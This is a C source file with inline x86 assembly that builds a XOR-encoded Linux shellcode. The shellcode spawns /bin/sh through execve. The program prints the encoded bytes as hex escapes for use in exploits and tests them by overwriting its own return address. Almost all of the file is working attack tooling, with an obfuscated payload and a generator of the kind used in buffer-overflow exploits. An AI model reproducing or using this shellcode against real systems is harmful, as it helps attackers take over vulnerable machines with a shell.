//
// beautiful xor shellcode() version 1.0
// By crashev (pawq@blue.profex.com.pl)->(crashev@ebox.pl)
//
//
//
//

sh() 

{
__asm__("
	      jmp getadres
dostartu:     popl %esi
              jmp start
getadres:     call dostartu
start:        xorl %ecx,%ecx
              add  $0x10,%esi        /* 10 - na jmp(2 bytes) */
              movb $0x2e,%cl        /* 2e bytes of code = generic shellcode() */

petla:	      xorb  $0x85,(%esi)
              inc  %esi
              loop petla
              jmp cos
exec:   /* zaxorowany shellcod start - 1 instrukcja  */
          popl %esi 
	  movl %esi,8(%esi)
	  xorl %eax,%eax
	  movb %al,7(%esi)
	  movl %eax,13(%esi)
	  movb $0xb,%al
	  movl %esi,%ebx
	  leal 8(%esi),%ecx
	  leal 13(%esi),%edx
	  int $0x80
	  	  
          /* exit(0) */
exit:     xorl %eax,%eax
          xorl %ebx,%ebx
          movb $0x1,%al
	  int $0x80
	  cos:
	  call exec
	  .string \"/bin/sh\"
/* zaxorowany shellcod stop */
		");


}
void endofsh() 
 {}

main(int argc,char *argv[]) {
  int *ret,i,a,c=0;
  char buf[5000];
 bzero(buf,sizeof(buf));
 strncpy(buf,sh,(int)(endofsh)-(int)(sh));

printf("\n Converting : \n ");
printf("----- cut here \n");

printf("\n ----- cut here \n");
printf("Sizeof code = %d \n",strlen(buf));
// od 30 pozycji len 26 xorujemy z ^85
for (i=29;i<=30+23+8+6+7;i++) {
buf[i]=(buf[i] & 0xff) ^ 0x85; // kodowanie
}
for (i=3;i<=(int)(endofsh)-(int)(sh);i++) {
if (buf[i]==0x00) break;
if ((buf[i] & 0xff) < 0x20 ) printf("\\x0%x",buf[i] & 0xff); else printf("\\x%x",buf[i] & 0xff);
if (buf[i]==0xffffffff) { c++;}
if (c==6) break;
  }
  i++;
for (a=i;a<=(int)(endofsh)-(int)(sh)-6;a++) {
if (buf[i]==0x00) break;
printf("%c",buf[a]);
}
printf("\n ----- cut here \n");
printf("Testing .... \n");
ret=(int *)&ret + 2;
(*ret)=(int)buf;

}